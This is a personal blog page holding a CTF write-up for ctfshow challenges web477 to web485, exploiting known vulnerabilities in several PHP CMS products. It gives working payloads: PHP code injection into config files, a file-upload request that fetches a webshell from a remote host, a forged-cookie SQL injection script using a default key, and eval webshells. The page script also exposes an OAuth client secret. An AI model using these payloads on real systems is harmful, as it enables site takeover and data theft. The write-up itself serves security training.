@@ -1,0 +1,716 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8" >
+
+<title>[ctfshow]CMS | fallingskies</title>
+
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
+<link rel="shortcut icon" href="https://fallingskies22.github.io/favicon.ico?v=1724150366542">
+<link rel="stylesheet" href="https://fallingskies22.github.io/styles/main.css">
+
+
+  
+    <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css" />
+  
+
+  
+
+
+<link rel="stylesheet" href="https://unpkg.com/aos@next/dist/aos.css" />
+<script src="https://cdn.jsdelivr.net/npm/vue/dist/vue.js"></script>
+
+
+
+    <meta name="description" content="web477
+CmsEasy
+后台地址为/admin
+使用账号admin/admin登录
+自定义标签功能处存在漏洞
+在标签内容处填写&lt;?php phpinfo()?&gt;
+点击预览即可
+web478
+PHPCMS
+访问安装路径/in..." />
+    <meta name="keywords" content="" />
+  </head>
+  <body>
+    <div id="app" class="main">
+
+      <div class="sidebar" :class="{ 'full-height': menuVisible }">
+  <div class="top-container" data-aos="fade-right">
+    <div class="top-header-container">
+      <a class="site-title-container" href="https://fallingskies22.github.io">
+        <img src="https://fallingskies22.github.io/images/avatar.png?v=1724150366542" class="site-logo">
+        <h1 class="site-title">fallingskies</h1>
+      </a>
+      <div class="menu-btn" @click="menuVisible = !menuVisible">
+        <div class="line"></div>
+      </div>
+    </div>
+    <div>
+      
+        
+          <a href="/" class="site-nav">
+            首页
+          </a>
+        
+      
+        
+          <a href="/archives" class="site-nav">
+            归档
+          </a>
+        
+      
+        
+          <a href="/tags" class="site-nav">
+            标签
+          </a>
+        
+      
+        
+          <a href="/post/about" class="site-nav">
+            关于
+          </a>
+        
+      
+        
+          <a href="/post/friends" class="site-nav">
+            友链
+          </a>
+        
+      
+    </div>
+  </div>
+  <div class="bottom-container" data-aos="flip-up" data-aos-offset="0">
+    <div class="social-container">
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    </div>
+    <div class="site-description">
+      <h3>想要去月球<h3>
+    </div>
+    <div class="site-footer">
+      Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a> | <a class="rss" href="https://fallingskies22.github.io/atom.xml" target="_blank">RSS</a>
+    </div>
+  </div>
+</div>
+
+
+      <div class="main-container">
+        <div class="content-container" data-aos="fade-up">
+          <div class="post-detail">
+            <h2 class="post-title">[ctfshow]CMS</h2>
+            <div class="post-date">2024-07-15</div>
+            
+              <div class="feature-container" style="background-image: url('https://fallingskies22.github.io/post-images/ctfshowcms.jpg')">
+              </div>
+            
+            <div class="post-content" v-pre>
+              <h2 id="web477">web477</h2>
+<p>CmsEasy</p>
+<p>后台地址为<code>/admin</code><br>
+使用账号admin/admin登录</p>
+<p>自定义标签功能处存在漏洞<br>
+在标签内容处填写<code>&lt;?php phpinfo()?&gt;</code></p>
+<p>点击预览即可</p>
+<h2 id="web478">web478</h2>
+<p>PHPCMS</p>
+<p>访问安装路径<code>/install/install.php</code>进行安装。</p>
+<p>参考文章<br>
+https://www.freebuf.com/articles/web/290031.html<br>
+https://xz.aliyun.com/t/5730<br>
+https://github.com/jiangsir404/PHP-code-audit/blob/master/phpcms/phpcmsv9.6.0%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.md</p>
+<p>存在文件上传漏洞。</p>
+<p>远程服务器上放置名为2.txt的一句话木马。<br>
+payload</p>
+<pre><code class="language-http">POST /index.php?m=member&amp;c=index&amp;a=register&amp;siteid=1 HTTP/1.1
+Host: d8af37c9-6857-475d-b5e6-8be363435c2a.challenge.ctf.show
+User-Agent: python-requests/2.27.1
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: close
+Content-Length: 169
+Content-Type: application/x-www-form-urlencoded
+
+siteid=1&amp;modelid=11&amp;username=test&amp;password=test123&amp;email=test123@163.com&amp;info[content]=&lt;img src=http://ip:port/2.txt?.php#.jpg&gt;&amp;dosubmit=1&amp;protocol=
+</code></pre>
+<figure data-type="image" tabindex="1"><img src="https://fallingskies22.github.io/post-images/1721269274559.png" alt="" loading="lazy"></figure>
+<p>注意：每跑一次payload需要修改用户名和邮箱，不然由于用户名存在会报错。</p>
+<h2 id="web479">web479</h2>
+<p>iCMS</p>
+<p>参考文章：<a href="https://github.com/Y4tacker/Web-Security/blob/4aac5ffb955667b15ee3110fb99f6df1016c6760/%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9EAndCMS%E5%AE%A1%E8%AE%A1/CMS/iCMS/iCMS-7.0.1%E5%89%8D%E5%8F%B0%E7%99%BB%E5%BD%95%E7%BB%95%E8%BF%87%E5%88%86%E6%9E%90/1.md">iCMS-7.0.1后台登录绕过分析</a></p>
+<p>根据提示使用默认key生成cookie，后台在解析时产生sql注入，使用万能密码绕过登录验证。</p>
+<pre><code class="language-php">&lt;?php
+//error_reporting(0);
+function urlsafe_b64decode($input){
+    $remainder = strlen($input) % 4;
+    if ($remainder) {
+        $padlen = 4 - $remainder;
+        $input .= str_repeat('=', $padlen);
+    }
+    return base64_decode(strtr($input, '-_!', '+/%'));
+}
+
+function authcode($string, $operation = 'DECODE', $key = '', $expiry = 0) {
+    $ckey_length   = 8;
+    $key           = md5($key ? $key : iPHP_KEY);
+    $keya          = md5(substr($key, 0, 16));
+    $keyb          = md5(substr($key, 16, 16));
+    $keyc          = $ckey_length ? ($operation == 'DECODE' ? substr($string, 0, $ckey_length): substr(md5(microtime()), -$ckey_length)) : '';
+
+    $cryptkey      = $keya.md5($keya.$keyc);
+    $key_length    = strlen($cryptkey);
+
+    $string        = $operation == 'DECODE' ? base64_decode(substr($string, $ckey_length)) : sprintf('%010d', $expiry ? $expiry + time() : 0).substr(md5($string.$keyb), 0, 16).$string;
+    $string_length = strlen($string);
+
+    $result        = '';
+    $box           = range(0, 255);
+
+    $rndkey        = array();
+    for($i = 0; $i &lt;= 255; $i++) {
+        $rndkey[$i] = ord($cryptkey[$i % $key_length]);
+    }
+
+    for($j = $i = 0; $i &lt; 256; $i++) {
+        $j       = ($j + $box[$i] + $rndkey[$i]) % 256;
+        $tmp     = $box[$i];
+        $box[$i] = $box[$j];
+        $box[$j] = $tmp;
+    }
+
+    for($a = $j = $i = 0; $i &lt; $string_length; $i++) {
+        $a       = ($a + 1) % 256;
+        $j       = ($j + $box[$a]) % 256;
+        $tmp     = $box[$a];
+        $box[$a] = $box[$j];
+        $box[$j] = $tmp;
+        $result  .= chr(ord($string[$i]) ^ ($box[($box[$a] + $box[$j]) % 256]));
+    }
+
+    if($operation == 'DECODE') {
+        if((substr($result, 0, 10) == 0 || substr($result, 0, 10) - time() &gt; 0) &amp;&amp; substr($result, 10, 16) == substr(md5(substr($result, 26).$keyb), 0, 16)) {
+            return substr($result, 26);
+        } else {
+            return '';
+        }
+    } else {
+        return $keyc.str_replace('=', '', base64_encode($result));
+    }
+}
+
+echo &quot;iCMS_iCMS_AUTH=&quot;.urlencode(authcode(&quot;'or 1=1##=iCMS[192.168.0.1]=#1&quot;,&quot;ENCODE&quot;,&quot;n9pSQYvdWhtBz3UHZFVL7c6vf4x6fePk&quot;));
+</code></pre>
+<figure data-type="image" tabindex="2"><img src="https://fallingskies22.github.io/post-images/1721299503041.png" alt="" loading="lazy"></figure>
+<h2 id="web480">web480</h2>
+<p>分析提供源码</p>
+<pre><code class="language-php">&lt;?php
+
+class config{
+	public static function init(){
+		foreach ($_REQUEST['conf'] as $key =&gt; $value) {
+	     	config::change($key, $value);
+		}
+	}
+
+	public static function change($k,$v){
+		$conf = self::parseFile('config.php');
+	    $conf[$k] = $v;
+	    self::saveValues($conf);
+	}
+	public static function parseFile($file)
+    {
+        $options = array();
+        foreach (file($file) as $line) {
+            $line = trim(preg_replace(array(&quot;/^.*define\([\&quot;']/&quot;, &quot;/[^&amp;][#][@].*$/&quot;), &quot;&quot;, $line));
+            if ($line != &quot;&quot; &amp;&amp; substr($line, 0, 2) != &quot;&lt;?&quot; &amp;&amp; substr($line, -2, 2) != &quot;?&gt;&quot;) {
+                $line = str_replace(array(&quot;&lt;?php&quot;, &quot;?&gt;&quot;, &quot;&lt;?&quot;,), &quot;&quot;, $line);
+
+                $opts = preg_split(&quot;/[\&quot;'],/&quot;, $line);
+
+                if (count($opts) == 2) {
+                    if (substr($opts[1], 0, 1) == '&quot;' || substr($opts[1], 0, 1) == &quot;'&quot;) {
+                        $opts[1] = substr($opts[1], 1, -3);
+                    } else {
+                        $opts[1] = substr($opts[1], 0, -2);
+                    }
+
+                    if (substr($opts[0], -5, 5) == &quot;_HTML&quot;) {
+                        $opts[1] = eval(&quot;return &quot; . $opts[1] . &quot;;&quot;);
+                    }
+                    $options[$opts[0]] = str_replace(&quot;\'&quot;, &quot;'&quot;, $opts[1]);
+                }
+            }
+        }
+        return $options;
+    }
+	public static function saveValues($values, $configname = '')  
+    {
+        $profile = null;
+        $str = &quot;&lt;?php\n&quot;;
+        foreach ($values as $directive =&gt; $value) {
+            $directive = trim(strtoupper($directive));
+            if ($directive == 'CURRENTCONFIGNAME') {  
+                $profile = $value;
+                continue;
+            }
+            $str .= &quot;define(\&quot;$directive\&quot;,&quot;;
+            $value = stripslashes($value); 
+            if (substr($directive, -5, 5) == &quot;_HTML&quot;) {
+                $value = htmlentities($value, ENT_QUOTES, LANG_CHARSET);
+                $value = str_replace(array(&quot;\r\n&quot;, &quot;\r&quot;, &quot;\n&quot;), &quot;&quot;, $value);
+                $str .= &quot;exponent_unhtmlentities('$value')&quot;;
+            } elseif (is_int($value)) {
+                $str .= &quot;'&quot; . $value . &quot;'&quot;;
+            } else {
+                if ($directive != 'SESSION_TIMEOUT') {
+                    $str .= &quot;'&quot; . str_replace(&quot;'&quot;, &quot;\'&quot;, $value) . &quot;'&quot;; 
+                }
+                else {
+                    $str .= &quot;'&quot; . str_replace(&quot;'&quot;, '', $value) . &quot;'&quot;;
+                }
+            }
+            $str .= &quot;);\n&quot;;
+        }
+
+        $str .= '?&gt;';
+        if ($configname == '') {
+            $str .= &quot;\n&lt;?php\ndefine(\&quot;CURRENTCONFIGNAME\&quot;,\&quot;$profile\&quot;);\n?&gt;&quot;; 
+        }
+        self::writeFile($str, $configname);
+    }
+
+    public static function writeFile($str, $configname = '')
+    {
+        if ($configname == &quot;&quot;) {
+            $configname = &quot;config.php&quot;;
+        }
+        $conffolder = pathinfo($configname);
+        if (file_exists($configname)) {
+            $fh = fopen($configname, &quot;w&quot;);
+            fwrite($fh, $str);
+            fclose($fh);
+        } else {
+            echo('Unable to write configuration') . '&lt;br /&gt;';
+        }
+    }
+
+
+}
+</code></pre>
+<p>可以通过<code>saveValues</code>函数中的<code>$profile</code>参数，注入php代码到<code>config.php</code>中。</p>
+<p>payload</p>
+<pre><code>?conf[CURRENTCONFIGNAME]=&quot;);?&gt;%0a&lt;?php%20system(%27cat%20/flag%27);?&gt;
+</code></pre>
+<h2 id="web481">web481</h2>
+<p>提示appcms 2.0.*<br>
+并且提供了index.php源码</p>
+<pre><code class="language-php">&lt;?php
+error_reporting(0);
+
+if(md5($_GET['session'])=='3e858ccd79287cfe8509f15a71b4c45d'){
+$configs=&quot;c&quot;.&quot;o&quot;.&quot;p&quot;.&quot;y&quot;;
+$configs(trim($_GET['url']),$_GET['cms']);}
+
+?&gt;
+nothing here
+</code></pre>
+<p>参考文章：<a href="https://chybeta.github.io/2017/12/17/AppCMS-2-0-101-%E5%90%8E%E9%97%A8%E5%88%86%E6%9E%90/">AppCMS 2.0.101 后门分析</a></p>
+<p>payload</p>
+<pre><code>POST /?session=ctfshow&amp;url=php://input&amp;cms=shell.php
+&lt;?php @eval($_POST[1]);?&gt;
+</code></pre>
+<figure data-type="image" tabindex="3"><img src="https://fallingskies22.github.io/post-images/1721353052651.png" alt="" loading="lazy"></figure>
+<h2 id="web482">web482</h2>
+<p>zzcms8.1</p>
+<p>参考文章：<a href="https://cloud.tencent.com/developer/article/2204326">zzcms8.1重装漏洞</a></p>
+<p>访问<code>install/index.php</code>进行重装，post上传<code>step=2</code>来绕过lock的检测。</p>
+<figure data-type="image" tabindex="4"><img src="https://fallingskies22.github.io/post-images/1721361962277.png" alt="" loading="lazy"></figure>
+<p>这里需要将地址改为127.0.0.1,localhost不知道为啥不行。</p>
+<p>安装成功后就能得到flag</p>
+<figure data-type="image" tabindex="5"><img src="https://fallingskies22.github.io/post-images/1721362079850.png" alt="" loading="lazy"></figure>
+<p>原本这个重装处还有一个代码注入的漏洞。</p>
+<p>/admin/siteconfig.php<br>
+<img src="https://fallingskies22.github.io/post-images/1721362157272.png" alt="" loading="lazy"></p>
+<p>在安装第五步时，例如在<code>siteurl</code>参数中插入<code>http://127.0.0.1&quot;);phpinfo();</code>就能将代码注入到<code>inc/config.php</code>中。</p>
+<h2 id="web483">web483</h2>
+<p>齐博cms7.0</p>
+<p>参考文章：<a href="https://xz.aliyun.com/t/2248">齐博cmsv7.0后台getshell</a></p>
+<p>在栏目添加功能处增加栏目<code>${system($_GET[1])}</code></p>
+<figure data-type="image" tabindex="6"><img src="https://fallingskies22.github.io/post-images/1721441296211.png" alt="" loading="lazy"></figure>
+<p>访问<code>/data/guide_fid.php</code>即可执行命令。</p>
+<h2 id="web484">web484</h2>
+<p>eyoucms<br>
+参考文章：<a href="https://blog.csdn.net/qq_48985780/article/details/121945304">EyouCms前台GetShell漏洞复现</a></p>
+<p>漏洞点位于<code>application\api\controller\Uploadify.php</code></p>
+<pre><code class="language-php">&lt;?php
+$src = file_get_contents('php://input');//使用php伪协议写入
+        if (preg_match(&quot;#^data:image/(\w+);base64,(.*)$#&quot;, $src, $matches)) { //matches被赋值为搜索出来的结果
+            $previewUrl = sprintf(
+                &quot;%s://%s%s&quot;,//类c的输出语言
+                isset($_SERVER['HTTPS']) &amp;&amp; $_SERVER['HTTPS'] != 'off' ? 'https' : 'http',//输出http或者https
+                $_SERVER['HTTP_HOST'],$_SERVER['REQUEST_URI']//host，不重要的东西
+            );
+            $previewUrl = str_replace(&quot;preview.php&quot;, &quot;&quot;, $previewUrl);//如果previewUrl也有preview.php则过滤
+            $base64 = $matches[2];//获取base64数据
+            $type = $matches[1];//获取base64后缀
+            if ($type === 'jpeg') {
+                $type = 'jpg';
+            }//没什么用的判断
+        
+            $filename = md5($base64).&quot;.$type&quot;;//将传入的base64那儿进行md5加密，再添上文件类型
+            $filePath = $DIR.DIRECTORY_SEPARATOR.$filename;//文件存放路径位preveiw/文件名
+        
+            if (file_exists($filePath)) {//存在即返回存在的路径
+                die('{&quot;jsonrpc&quot; : &quot;2.0&quot;, &quot;result&quot; : &quot;'.$previewUrl.'preview/'.$filename.'&quot;, &quot;id&quot; : &quot;id&quot;}');
+            } else {
+                $data = base64_decode($base64);//不存在就进行base64解密
+                file_put_contents($filePath, $data);//并且写入文件
+                die('{&quot;jsonrpc&quot; : &quot;2.0&quot;, &quot;result&quot; : &quot;'.$previewUrl.'preview/'.$filename.'&quot;, &quot;id&quot; : &quot;id&quot;}');//返回文件路径
+            }
+</code></pre>
+<p>写入php文件。</p>
+<pre><code>POST /index.php/api/uploadify/preview HTTP/1.1
+data:image/php;base64,PD9waHAgcGhwaW5mbygpOw==
+</code></pre>
+<figure data-type="image" tabindex="7"><img src="https://fallingskies22.github.io/post-images/1721487156413.png" alt="" loading="lazy"></figure>
+<p>访问路径<code>/preview/c7a10e2172ba0f171ec45f376fb0601d.php</code>即可查看phpinfo页面。<br>
+这里环境变量的flag不对🤡<br>
+还是老实写个shell连上查看<code>/flag</code></p>
+<h2 id="web485">web485</h2>
+<p>海洋CMS<br>
+访问<code>/data/admin/ver.txt</code>查看版本号为V210202<br>
+搜索到相关cve：https://wlfw.zepc.edu.cn/info/1712/58482.htm</p>
+<p>登不上后台啊<code>/admin</code>，不知道咋搞<br>
+<img src="https://fallingskies22.github.io/post-images/1722670803293.png" alt="" loading="lazy"></p>
+<p>看下源码里怎么写的。搜一下告警，发现在<br>
+<code>admin/templets/login.htm</code></p>
+<pre><code class="language-html">&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;head&gt;
+&lt;title&gt;后台管理中心&lt;/title&gt;
+&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt;
+&lt;link href=&quot;js/css/style.css&quot; rel=&quot;stylesheet&quot; type=&quot;text/css&quot; /&gt;
+&lt;link href=&quot;js/css/font-awesome.min.css&quot; rel=&quot;stylesheet&quot; type=&quot;text/css&quot; /&gt;
+&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;js/css/styles1.css&quot; title=&quot;styles1&quot; media=&quot;screen&quot; /&gt;
+&lt;style&gt;
+.submit_btn{background: #00b7ee;}
+&lt;/style&gt;
+&lt;script src=&quot;js/jquery.js&quot;&gt;&lt;/script&gt;
+&lt;script src=&quot;js/styleswitch.js&quot;&gt;&lt;/script&gt;
+&lt;script src=&quot;js/Particleground.js&quot;&gt;&lt;/script&gt;
+&lt;script&gt;
+$(document).ready(function() {
+  $('body').particleground({
+    dotColor: 'rgba(95,184,120,0.5)',
+    lineColor: 'rgba(95,184,120,0.5)'
+  });
+});
+&lt;/script&gt;
+&lt;style type=&quot;text/css&quot;&gt;
+  html,body{height: 100%;position: relative;background-color:#5fb878!important;background-image: linear-gradient(to right bottom, #0066CC , #5fb878)!important;}
+  .admin_login{box-shadow:0 0 15px #555555;}
+&lt;/style&gt;
+&lt;/head&gt;
+&lt;body onload=&quot;javascript:document.formsearch.userid.focus();&quot; id=&quot;canvas&quot;&gt;
+  &lt;div class=&quot;admin_login&quot;&gt;
+    &lt;form method=&quot;post&quot; action=&quot;login.php&quot; name=&quot;formsearch&quot; id=&quot;formsearch&quot;&gt;
+	 &lt;input type=&quot;hidden&quot; name=&quot;gotopage&quot; value=&quot;&lt;?php if(!empty($gotopage)) echo $gotopage;?&gt;&quot; /&gt;
+      	&lt;input type=&quot;hidden&quot; name=&quot;dopost&quot; value=&quot;login&quot; /&gt;
+    &lt;div class=&quot;admin_title&quot;&gt;
+       &lt;strong&gt;海洋&lt;span style=&quot;color:#5FB878&quot;&gt;CMS&lt;/span&gt; 站点管理系统&lt;/strong&gt;
+       &lt;em&gt;SeA Content Management System&lt;/em&gt;
+    &lt;/div&gt;
+    &lt;div class=&quot;admin_user&quot;&gt;
+       &lt;input type=&quot;text&quot; name=&quot;userid&quot; placeholder=&quot;管理员账号&quot; class=&quot;login_txt&quot;&gt;
+    &lt;/div&gt;
+    &lt;div class=&quot;admin_pwd&quot;&gt;
+       &lt;input type=&quot;password&quot; name=&quot;pwd&quot; placeholder=&quot;管理员密码&quot; class=&quot;login_txt&quot;&gt;
+    &lt;/div&gt;
+	
+	&lt;?php $v=file_get_contents(&quot;../data/admin/adminvcode.txt&quot;); ?&gt;
+    &lt;div class=&quot;admin_val&quot; style=&quot;&lt;?php if($v==0) echo 'display:none;'; ?&gt;&quot;&gt;
+       &lt;input type=&quot;text&quot; name=&quot;validate&quot; placeholder=&quot;验证码&quot; maxlength=&quot;4&quot; class=&quot;login_txt left&quot; style=&quot;text-transform:uppercase;&quot;&gt;
+       &lt;div id=&quot;yzm&quot; class=&quot;right&quot;&gt;&lt;img id='code_img' onClick=&quot;this.src=this.src+'?get=' + new Date()&quot; src='../include/vdimgck.php'&gt;&lt;/div&gt;
+    &lt;/div&gt;
+	
+    &lt;div class=&quot;admin_sub&quot;&gt;
+&lt;?php
+//检测后台目录是否更名
+$cdir=strtolower($cdir);
+if($cdir==&quot;/admin/login.php&quot;)
+{
+	echo '&lt;font style=&quot;color: #c10f0f;font-weight: bold;font-size: 12px;&quot;&gt;后台目录名不能是admin，请修改后重试！';
+}
+else
+{
+	echo '&lt;input type=&quot;submit&quot; value=&quot;立即登陆&quot; class=&quot;submit_btn&quot;&gt;';
+}
+?&gt;
+    &lt;/div&gt;
+    &lt;div class=&quot;admin_info&quot;&gt;
+        &lt;p style=&quot;color: #555&quot;&gt;© SEACMS.NET&lt;/p&gt;
+    &lt;/div&gt;
+    &lt;/form&gt;   
+  &lt;/div&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+<p>看下<code>admin/login.php</code>里逻辑，最后才会<code>include('templets/login.htm');</code>，就是说这里还是可以登陆的，只是要手动发包。</p>
+<pre><code class="language-php">&lt;?php 
+//略
+
+if($dopost=='login' AND $v==0)
+{
+		$cuserLogin = new userLogin($admindir);
+		if(!empty($userid) &amp;&amp; !empty($pwd))
+		{
+			$res = $cuserLogin-&gt;checkUser($userid,$pwd);
+
+			//success
+			if($res==1)
+			{
+				$cuserLogin-&gt;keepUser();
+				$_SESSION['hashstr']=$hashstr;
+				if(!empty($gotopage))
+				{
+					ShowMsg('成功登录，正在转向管理管理主页！',$gotopage);
+					exit();
+				}
+				else
+				{
+					ShowMsg('成功登录，正在转向管理管理主页！',&quot;index.php&quot;);
+					exit();
+				}
+			}
+
+			//error
+			else if($res==-1)
+			{
+				ShowMsg('你的用户名不存在!','-1');
+				exit();
+			}
+			else
+			{
+				ShowMsg('你的密码错误!','-1');
+				exit();
+			}
+		}
+
+		//password empty
+		else
+		{
+			ShowMsg('用户和密码没填写完整!','-1');
+				exit();
+		}
+
+}
+$cdir = $_SERVER['PHP_SELF']; 
+include('templets/login.htm');
+
+?&gt;
+</code></pre>
+<p>使用admin/admin登录后台<br>
+<img src="https://fallingskies22.github.io/post-images/1722671038611.png" alt="" loading="lazy"></p>
+<p>根据文章提示，漏洞在<code>admin_notify.php</code>,看下源码。</p>
+<pre><code class="language-php">&lt;?php 
+header('Content-Type:text/html;charset=utf-8');
+require_once(dirname(__FILE__).&quot;/config.php&quot;);
+CheckPurview();
+if($action==&quot;set&quot;)
+{
+	$notify1= $_POST['notify1'];
+	$notify2= $_POST['notify2'];
+	$notify3= $_POST['notify3'];
+	$open=fopen(&quot;../data/admin/notify.php&quot;,&quot;w&quot; );
+	$str='&lt;?php  ';
+	$str.='$notify1 = &quot;';
+	$str.=&quot;$notify1&quot;;
+	$str.='&quot;; ';
+	$str.='$notify2 = &quot;';
+	$str.=&quot;$notify2&quot;;
+	$str.='&quot;; ';
+	$str.='$notify3 = &quot;';
+	$str.=&quot;$notify3&quot;;
+	$str.='&quot;; ';
+	$str.=&quot; ?&gt;&quot;;
+	fwrite($open,$str);
+	fclose($open);
+	ShowMsg(&quot;成功保存设置!&quot;,&quot;admin_notify.php&quot;);
+	exit;
+}
+
+?&gt;
+&lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD XHTML 1.0 Transitional//EN&quot; &quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&quot;&gt;
+&lt;html xmlns=&quot;http://www.w3.org/1999/xhtml&quot;&gt;
+&lt;head&gt;
+&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt;
+&lt;title&gt;会员消息通知&lt;/title&gt;
+&lt;link  href=&quot;img/style.css&quot; rel=&quot;stylesheet&quot; type=&quot;text/css&quot; /&gt;
+&lt;link  href=&quot;img/style.css&quot; rel=&quot;stylesheet&quot; type=&quot;text/css&quot; /&gt;
+&lt;script src=&quot;js/common.js&quot; type=&quot;text/javascript&quot;&gt;&lt;/script&gt;
+&lt;script src=&quot;js/main.js&quot; type=&quot;text/javascript&quot;&gt;&lt;/script&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;script type=&quot;text/JavaScript&quot;&gt;if(parent.$('admincpnav')) parent.$('admincpnav').innerHTML='后台首页&amp;nbsp;&amp;raquo;&amp;nbsp;管理员&amp;nbsp;&amp;raquo;&amp;nbsp;百度主动推送设置 ';&lt;/script&gt;
+&lt;div class=&quot;r_main&quot;&gt;
+  &lt;div class=&quot;r_content&quot;&gt;
+    &lt;div class=&quot;r_content_1&quot;&gt;
+&lt;form action=&quot;?action=set&quot; method=&quot;post&quot;&gt;	
+&lt;table width=&quot;100%&quot; border=&quot;0&quot; cellpadding=&quot;0&quot; cellspacing=&quot;0&quot; class=&quot;tb_style&quot;&gt;
+&lt;tbody&gt;&lt;tr class=&quot;thead&quot;&gt;
+&lt;td colspan=&quot;5&quot; class=&quot;td_title&quot;&gt;会员消息通知&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;?php  require_once(&quot;../data/admin/notify.php&quot;); ?&gt;
+
+
+&lt;tr&gt;
+&lt;td width=&quot;80%&quot; align=&quot;left&quot; height=&quot;30&quot; class=&quot;td_border&quot;&gt;
+&lt;br&gt;通知1：&lt;br&gt;&lt;textarea name=&quot;notify1&quot; style=&quot;width:600px; height:60px;&quot;&gt;&lt;?php  echo $notify1;?&gt;&lt;/textarea&gt;
+&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td width=&quot;80%&quot; align=&quot;left&quot; height=&quot;30&quot; class=&quot;td_border&quot;&gt;
+&lt;br&gt;通知2：&lt;br&gt;&lt;textarea name=&quot;notify2&quot; style=&quot;width:600px; height:60px;&quot;&gt;&lt;?php  echo $notify2;?&gt;&lt;/textarea&gt;
+&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td width=&quot;80%&quot; align=&quot;left&quot; height=&quot;30&quot; class=&quot;td_border&quot;&gt;
+&lt;br&gt;通知3：&lt;br&gt;&lt;textarea name=&quot;notify3&quot; style=&quot;width:600px; height:60px;&quot;&gt;&lt;?php  echo $notify3;?&gt;&lt;/textarea&gt;
+&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td width=&quot;10%&quot; align=&quot;left&quot; height=&quot;30&quot; class=&quot;td_border&quot;&gt;
+&lt;input type=&quot;submit&quot; value=&quot;确 认&quot; class=&quot;btn&quot; &gt;
+&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td width=&quot;90%&quot; align=&quot;left&quot; height=&quot;30&quot; class=&quot;td_border&quot;&gt;
+* 最多支持发布3条会员通知，删除通知内容即可取消发布该条。
+&lt;/td&gt;
+&lt;/tr&gt;
+
+&lt;tr&gt;
+&lt;td width=&quot;90%&quot; align=&quot;left&quot; height=&quot;30&quot; class=&quot;td_border&quot;&gt;
+* 如果修改无效，请检查/data/admin/notify.php文件权限是否可写。
+&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;&lt;/table&gt;	
+	
+
+&lt;/form&gt;
+&lt;/div&gt;
+	&lt;/div&gt;
+&lt;/div&gt;
+&lt;?php 
+viewFoot();
+?&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+<p>这里可以控制写入php文件的内容🙂，只需要注意闭合一下引号<br>
+访问/admin/admin_notify.php<br>
+<img src="https://fallingskies22.github.io/post-images/1722671593542.png" alt="" loading="lazy"></p>
+<p>在notify3处写payload</p>
+<pre><code>123&quot;;phpinfo();$notify=&quot;
+</code></pre>
+<p>提交即可发现phpinfo</p>
+<p><img src="https://fallingskies22.github.io/post-images/1722671793849.png" alt="" loading="lazy"><br>
+这个phpinfo里的flag不对，真flag在根目录。🤡</p>
+<pre><code>123&quot;;system('cat /flag');$notify=&quot;
+</code></pre>
+<h2 id="web485-2">web485</h2>
+<p>DSCMS(20210531)</p>
+<p>找不到具体版本。。。<br>
+用户登录处验证码也没有，注册也不行。😵<br>
+找了一圈公开cve也没有，感觉应该是后台漏洞。。。</p>
+
+            </div>
+            
+            
+              <div class="next-post">
+                <div class="next">下一篇</div>
+                <a href="https://fallingskies22.github.io/post/ctfshowkuang-jia-fu-xian/">
+                  <h3 class="post-title">
+                    [ctfshow]框架复现
+                  </h3>
+                </a>
+              </div>
+            
+
+            
+              
+                <div id="gitalk-container" data-aos="fade-in"></div>
+              
+
+              
+            
+
+          </div>
+
+        </div>
+      </div>
+    </div>
+
+    <script src="https://unpkg.com/aos@next/dist/aos.js"></script>
+<script type="application/javascript">
+
+AOS.init();
+
+var app = new Vue({
+  el: '#app',
+  data: {
+    menuVisible: false,
+  },
+})
+
+</script>
+
+
+  <script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+  <script>
+    hljs.initHighlightingOnLoad()
+  </script>
+
+
+
+
+  
+    <script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+    <script>
+
+      var gitalk = new Gitalk({
+        clientID: '1b08861b8ad19018640e',
+        clientSecret: '1881a7245597aa70e1ffc8412e5b6c1eb0ad7241',
+        repo: 'fallingskies22.github.io',
+        owner: 'fallingskies22',
+        admin: ['fallingskies22'],
+        id: (location.pathname).substring(0, 49),      // Ensure uniqueness and length less than 50
+        distractionFreeMode: false  // Facebook-like distraction free mode
+      })
+
+      gitalk.render('gitalk-container')
+
+    </script>
+  
+
+  
+
+
+
+
+  </body>
+</html>
